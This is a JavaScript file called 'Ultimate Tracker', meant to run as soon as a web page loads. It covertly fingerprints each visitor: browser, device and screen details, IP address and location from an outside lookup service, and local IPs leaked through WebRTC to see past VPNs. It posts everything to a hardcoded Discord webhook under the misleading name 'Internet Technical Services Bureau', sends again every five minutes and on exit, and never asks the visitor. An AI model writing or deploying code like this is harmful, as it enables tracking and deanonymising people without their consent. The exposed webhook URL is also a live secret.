// ========================
// Ultimate Tracker - Complete Version
// ========================

// Helper Functions
function checkWebGL2Support() {
    try {
        const canvas = document.createElement('canvas');
        return !!canvas.getContext('webgl2');
    } catch (e) {
        return false;
    }
}

function checkWebPSupport() {
    const elem = document.createElement('canvas');
    if (!!(elem.getContext && elem.getContext('2d'))) {
        return elem.toDataURL('image/webp').indexOf('data:image/webp') === 0;
    }
    return false;
}

function checkLocalStorage() {
    try {
        localStorage.setItem('test', 'test');
        localStorage.removeItem('test');
        return true;
    } catch (e) {
        return false;
    }
}

function checkSessionStorage() {
    try {
        sessionStorage.setItem('test', 'test');
        sessionStorage.removeItem('test');
        return true;
    } catch (e) {
        return false;
    }
}

function getWebGLRenderer() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return 'not available';
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
}

function checkWebRTCLeaks() {
    const pc = new RTCPeerConnection();
    const ips = new Set();
    
    pc.createDataChannel('');
    pc.createOffer()
        .then(offer => pc.setLocalDescription(offer))
        .catch(err => console.log(err));

    pc.onicecandidate = (event) => {
        if (!event.candidate) return;
        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        const match = event.candidate.candidate.match(ipRegex);
        if (match) ips.add(match[1]);
    };

    return Array.from(ips);
}

async function getIPAndLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'unknown',
            city: data.city || 'unknown',
            region: data.region || 'unknown',
            country: data.country_name || 'unknown',
            isp: data.org || 'unknown'
        };
    } catch (error) {
        return {
            ip: 'blocked',
            city: 'unknown',
            region: 'unknown',
            country: 'unknown',
            isp: 'unknown'
        };
    }
}

// Main Tracking Function
async function initializeUltimateTracker() {
    const ipInfo = await getIPAndLocation();

    const trackerData = {
        // IP and Location
        ipAddress: ipInfo.ip,
        location: `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`,
        isp: ipInfo.isp,

        // Basic System Info
        browser: navigator.userAgent,
        operatingSystem: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString(),
        vendor: navigator.vendor,

        // Screen & Window
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        windowSize: `${window.innerWidth}x${window.innerHeight}`,
        availableScreenSpace: `${window.screen.availWidth}x${window.screen.availHeight}`,
        colorDepth: window.screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        
        // Device Capabilities
        deviceMemory: navigator.deviceMemory,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceType: /Mobile|Tablet|iPad|iPhone|Android/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
        touchScreen: navigator.maxTouchPoints > 0,
        
        // Network & Connection
        onlineStatus: navigator.onLine,
        connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
        vpnDetection: {
            webRTC: checkWebRTCLeaks()
        },

        // Browser Features
        cookiesEnabled: navigator.cookieEnabled,
        localStorage: checkLocalStorage(),
        sessionStorage: checkSessionStorage(),
        webWorkers: typeof Worker !== 'undefined',
        serviceWorkers: 'serviceWorker' in navigator,
        webAssembly: typeof WebAssembly !== 'undefined',
        webGL2: checkWebGL2Support(),
        webP: checkWebPSupport(),
        webGLRenderer: getWebGLRenderer(),
        
        // User Preferences
        prefersDarkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
        prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
        doNotTrack: navigator.doNotTrack,
        
        // Session Info
        sessionDuration: 0,
        scrollPosition: {
            x: window.scrollX,
            y: window.scrollY
        }
    };

    await sendToDiscordWebhook(trackerData);
    return trackerData;
}

// Discord Webhook Integration
async function sendToDiscordWebhook(data) {
    const webhookUrl = 'https://discord.com/api/webhooks/1402364477877518446/1v4i9TTbl1-3eIQhrBI_rfMNfI9FJ0QJ0g3t-C6bDKzJzjD0VXYqDvn9jFgu1fvHUptb';

    // Format the data into multiple embeds to avoid Discord's field limits
    const embeds = [
        {
            title: "🌐 Network & Location",
            color: 0x3498db,
            fields: [
                { name: "IP Address", value: data.ipAddress, inline: true },
                { name: "Location", value: data.location, inline: true },
                { name: "ISP", value: data.isp, inline: true },
                { name: "Connection Type", value: data.connectionType, inline: true },
                { name: "Online Status", value: data.onlineStatus ? "Online" : "Offline", inline: true },
                { name: "WebRTC IPs", value: data.vpnDetection.webRTC.join(', ') || 'None', inline: false }
            ],
            timestamp: data.timestamp
        },
        {
            title: "💻 System Information",
            color: 0x9b59b6,
            fields: [
                { name: "Browser", value: data.browser.substring(0, 100) + (data.browser.length > 100 ? "..." : ""), inline: false },
                { name: "OS", value: data.operatingSystem, inline: true },
                { name: "Language", value: data.language, inline: true },
                { name: "Timezone", value: data.timeZone, inline: true },
                { name: "Vendor", value: data.vendor || 'unknown', inline: true }
            ]
        },
        {
            title: "📱 Device Information",
            color: 0xe91e63,
            fields: [
                { name: "Device Type", value: data.deviceType, inline: true },
                { name: "Screen Resolution", value: data.screenResolution, inline: true },
                { name: "Window Size", value: data.windowSize, inline: true },
                { name: "Color Depth", value: data.colorDepth, inline: true },
                { name: "Pixel Ratio", value: data.pixelRatio, inline: true },
                { name: "Device Memory", value: data.deviceMemory || 'unknown', inline: true },
                { name: "CPU Cores", value: data.hardwareConcurrency || 'unknown', inline: true },
                { name: "Touch Screen", value: data.touchScreen ? "Yes" : "No", inline: true }
            ]
        },
        {
            title: "🔧 Browser Capabilities",
            color: 0xf1c40f,
            fields: [
                { name: "Cookies Enabled", value: data.cookiesEnabled ? "Yes" : "No", inline: true },
                { name: "Local Storage", value: data.localStorage ? "Yes" : "No", inline: true },
                { name: "Session Storage", value: data.sessionStorage ? "Yes" : "No", inline: true },
                { name: "Web Workers", value: data.webWorkers ? "Supported" : "Not Supported", inline: true },
                { name: "Service Workers", value: data.serviceWorkers ? "Supported" : "Not Supported", inline: true },
                { name: "WebAssembly", value: data.webAssembly ? "Supported" : "Not Supported", inline: true },
                { name: "WebGL2", value: data.webGL2 ? "Supported" : "Not Supported", inline: true },
                { name: "WebP", value: data.webP ? "Supported" : "Not Supported", inline: true },
                { name: "WebGL Renderer", value: data.webGLRenderer || 'unknown', inline: false }
            ]
        },
        {
            title: "⚙️ User Preferences",
            color: 0x2ecc71,
            fields: [
                { name: "Dark Mode", value: data.prefersDarkMode ? "Enabled" : "Disabled", inline: true },
                { name: "Reduced Motion", value: data.prefersReducedMotion ? "Enabled" : "Disabled", inline: true },
                { name: "Do Not Track", value: data.doNotTrack || "Not set", inline: true }
            ]
        }
    ];

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: "📊 New visitor data collected!",
                embeds: embeds,
                username: "Internet Technical Services Bureau",
            })
        });

        if (!response.ok) {
            console.error('Discord API error:', response.status);
        }
    } catch (error) {
        console.error('Failed to send to Discord:', error);
    }
}

// Initialize and Run Tracker
(async function() {
    const tracker = await initializeUltimateTracker();
    console.log('Tracker initialized:', tracker);

    // Update session duration every second
    setInterval(() => {
        tracker.sessionDuration++;
        // Send update every 5 minutes
        if (tracker.sessionDuration % 300 === 0) {
            sendToDiscordWebhook(tracker);
        }
    }, 1000);

    // Track scrolling
    window.addEventListener('scroll', () => {
        tracker.scrollPosition = {
            x: window.scrollX,
            y: window.scrollY
        };
    });

    // Send final data when user leaves
    window.addEventListener('beforeunload', () => {
        sendToDiscordWebhook({
            ...tracker,
            event: 'User exiting',
            exitTime: new Date().toISOString()
        });
    });
})();
